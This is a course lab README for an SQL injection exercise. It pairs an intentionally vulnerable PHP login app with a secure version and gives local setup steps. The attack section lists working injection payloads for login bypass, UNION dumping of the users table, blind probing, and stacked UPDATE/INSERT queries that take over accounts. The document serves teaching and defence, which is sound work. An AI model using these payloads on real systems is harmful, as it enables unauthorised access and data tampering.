# Lab 5 — SQL Injection Attack and Defense
**System and Network Security (CS5.470) | IIIT Hyderabad**

---

## Project Structure

```
sns_lab5/
├── vulnerable_app/          # Step 3.1 — Intentionally insecure login app
│   ├── index.php            # Login form
│   ├── authentication.php   # Raw SQL query (vulnerable)
│   ├── connection.php       # DB connection
│   └── style.css            # UI styling
│
├── secure_app/              # Step 3.2 — Fixed, secure login app
│   ├── index.php            # Login form
│   ├── authentication.php   # Prepared statements + bcrypt
│   ├── connection.php       # DB connection (errors hidden)
│   ├── setup.php            # One-time password hashing utility
│   └── style.css            # UI styling
│
├── Screenshots/             # Attack screenshots (before & after)
├── db_setup.sql             # Database creation script
├── README.md                # This file
└── SECURITY.md              # Security analysis
```

---

## Setup Instructions

### 1. Environment
- Install **XAMPP** from https://www.apachefriends.org/
- Start **Apache** and **MySQL** from the XAMPP Control Panel
- Place this folder at: `C:\xampp\htdocs\sns_lab5\`

### 2. Database Setup
Open **http://localhost/phpmyadmin** → SQL tab → paste and run `db_setup.sql`

Or run manually:
```sql
CREATE DATABASE lab5;
USE lab5;

CREATE TABLE users (
    id       INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(255)
);

INSERT INTO users (username, password) VALUES ('user1', 'pass1');
INSERT INTO users (username, password) VALUES ('admin', 'admin123');
```

### 3. Run the Vulnerable App
Visit: **http://localhost/sns_lab5/vulnerable_app/**

Test normal login: `user1` / `pass1`

### 4. Run the Secure App
First, run setup (one time only):
**http://localhost/sns_lab5/secure_app/setup.php**

Then access: **http://localhost/sns_lab5/secure_app/**

---

## Attack Demonstrations

### Attack 1 — Authentication Bypass
- **URL:** `http://localhost/sns_lab5/vulnerable_app/`
- **Username:** `' OR '1'='1' -- `
- **Password:** `anything`
- **Effect:** Logs in without valid credentials

### Attack 2 — UNION-Based Injection (extract all users)
- **Username:** `' UNION SELECT id, username, password FROM users -- `
- **Password:** `anything`
- **Effect:** Dumps all rows from the users table

### Attack 3 — Blind SQL Injection
- **True condition:** Username = `admin' AND 1=1 -- ` → Login **succeeds**
- **False condition:** Username = `admin' AND 1=2 -- ` → Login **fails**
- **Effect:** Infer database contents without extracting data directly

### Attack 4 — Database Modification (MANDATORY)

> **⚠️ Important Note:** Database modification attacks will show **"Login failed"** on the
> initial attempt. This is expected — the injected SQL (UPDATE / INSERT / DELETE) still
> executes in the background via a stacked query, but the login query itself does not
> return a valid user row. **To verify the attack worked**, try logging in again with
> the modified credentials (e.g. `admin` / `hacked`) or check the `users` table in
> phpMyAdmin.

#### Change admin password:
- **Username:** `'; UPDATE users SET password='hacked' WHERE username='admin' -- `
- **Password:** `anything`
- **Verify:** After seeing "Login failed", log in again with `admin` / `hacked` — it should succeed, proving the password was changed.
- *(Requires taking screenshot before and after)*

#### Insert new user:
- **Username:** `'; INSERT INTO users (username, password) VALUES ('attacker','evil') -- `
- **Password:** `anything`
- **Verify:** After seeing "Login failed", log in with `attacker` / `evil` — it should succeed, proving the account was inserted.

---

## Secure App Verification
All the above payloads **fail** against `http://localhost/sns_lab5/secure_app/` because:
- Prepared statements treat input as data, not SQL syntax
- Passwords are hashed with bcrypt — not comparable to raw injection strings
- SQL errors are never shown to the user

---

## Submission
Zip as: `<group_number>_lab5.zip`
